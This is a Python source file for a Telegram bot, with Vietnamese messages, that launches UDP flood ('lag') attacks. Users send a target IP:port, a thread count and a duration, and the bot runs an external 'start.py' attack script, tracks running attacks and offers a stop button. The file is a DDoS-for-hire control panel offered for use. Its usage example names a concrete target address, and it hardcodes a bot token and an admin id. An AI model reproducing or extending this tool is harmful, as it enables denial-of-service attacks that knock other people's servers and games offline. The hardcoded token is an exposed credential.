import telebot
import subprocess
from threading import Lock
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

tokenbot = "7566533314:AAHaYpNzERykihJBDlt0N-Pzbf5cWLBmko0"

bot = telebot.TeleBot(tokenbot)
db_lock = Lock()
cooldowns = {}
active_attacks = {}


@bot.message_handler(commands=["start"])
def handle_start(message):
    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton(
        text="ADMIN",
        url=f"tg://user?id={6142730696}"
    )
    markup.add(button)

    bot.reply_to(
        message,
        (
            "```/lag UDP <IP/HOST:PORT> <luồng> <giây>```\n\n"
            "```/lag UDP 143.92.125.230:10013 10 900```\n\n"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.message_handler(commands=["lag"])
def handle_ping(message):
    telegram_id = message.from_user.id

    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 10:
        bot.reply_to(message, "❌ Chờ 10 giây trước khi bắt đầu đòn tấn công tiếp theo và nhớ dừng đòn tấn công trước đó.")
        return

    args = message.text.split()
    if len(args) != 5 or ":" not in args[2]:
        bot.reply_to(
            message,
            (
                "❌ *Lệnh Sai!*\n\n"
                "📌 *Lệnh Đúng:*\n"
                "`/lag UDP <IP/HOST:PORT> <luồng> <giây>`\n\n"
                "💡 *Ví Dụ:*\n"
                "`/lag UDP 143.92.125.230:10013 10 900`"
            ),
            parse_mode="Markdown",
        )
        return

    attack_type = args[1]
    ip_port = args[2]
    threads = args[3]
    duration = args[4]
    command = ["python", "start.py", attack_type, ip_port, threads, duration]

    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    active_attacks[telegram_id] = process
    cooldowns[telegram_id] = time.time()

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("⛔ Dừng tấn công", callback_data=f"stop_{telegram_id}"))

    bot.reply_to(
        message,
        (
            "*[✅] Tấn Công Thành Công [✅]*\n\n"
            f"🌐 *Địa Chỉ:* {ip_port}\n"
            f"⚙️ *Phương Pháp:* {attack_type}\n"
            f"🧟‍♀️ *Số Luồng:* {threads}\n"
            f"⏳ *Thời Gian:* {duration}\n\n"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])

    if call.from_user.id != telegram_id:
        bot.answer_callback_query(
            call.id, "❌ Chỉ có người dùng bắt đầu cuộc tấn công mới có thể dừng nó"
        )
        return

    if telegram_id in active_attacks:
        process = active_attacks[telegram_id]
        process.terminate()
        del active_attacks[telegram_id]

        bot.answer_callback_query(call.id, "✅ Đòn tấn công đã bị đỡ thành công.")
        bot.edit_message_text(
            "*[⛔] KẾT THÚC CUỘC TẤN CÔNG[⛔]*",
            chat_id=call.message.chat.id,
            message_id=call.message.id,
            parse_mode="Markdown",
        )
        time.sleep(3)
        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
    else:
        bot.answer_callback_query(call.id, "❌ Không tìm thấy đòn tấn công nào, vui lòng tiếp tục hành động của bạn.")


if __name__ == "__main__":
    bot.infinity_polling()
